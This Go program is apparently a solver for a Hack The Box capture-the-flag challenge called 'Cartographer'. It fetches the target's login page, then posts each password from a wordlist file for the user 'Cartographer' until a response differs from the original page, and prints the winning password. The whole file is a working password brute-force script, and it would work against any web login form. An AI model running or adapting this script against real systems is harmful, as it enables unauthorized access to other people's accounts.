package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func downloadAndSave(url string, filename string) {
	resp, err := http.Get(url)

	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatalln(err)
	}

	ioutil.WriteFile(filename, []byte(body), 79)
}

func postForm(URL string, username string, password string) []byte {

	resp, err := http.PostForm(URL, url.Values{"username": {username}, "password": {password}})

	if err != nil {
		log.Fatalln(err)
	}

	tempFile, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatalln(err)
	}

	return tempFile
}

func readPasswords(filename string) []string {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatalln(err)
	}

	passwords := strings.Split(string(content), "\n")

	return passwords
}

func main() {

	htmlFilename := "cartographer.html"
	cssFileName := "cartographer.css"
	htmlURL := "http://docker.hackthebox.eu:30594"
	cssURL := "http://docker.hackthebox.eu:30594/style.css"

	_, err := ioutil.ReadFile(htmlFilename)
	if err != nil {
		downloadAndSave(htmlURL, htmlFilename)
	}

	_, err = ioutil.ReadFile(cssFileName)
	if err != nil {
		downloadAndSave(cssURL, cssFileName)
	}

	ogFile, err := ioutil.ReadFile(htmlFilename)

	if err != nil {
		log.Fatalln(err)
	}

	passwords := readPasswords("cain&abel.txt")

	for _, password := range passwords {

		tempFile := postForm(htmlURL, "Cartographer", password)

		if !bytes.Equal(tempFile, ogFile) {
			fmt.Println("SUCCESS:", password)

			os.Exit(0)
		}
		// else {
		// 	fmt.Println("Invalid Password:", password)
		// }
	}

	fmt.Println("Finished")
}
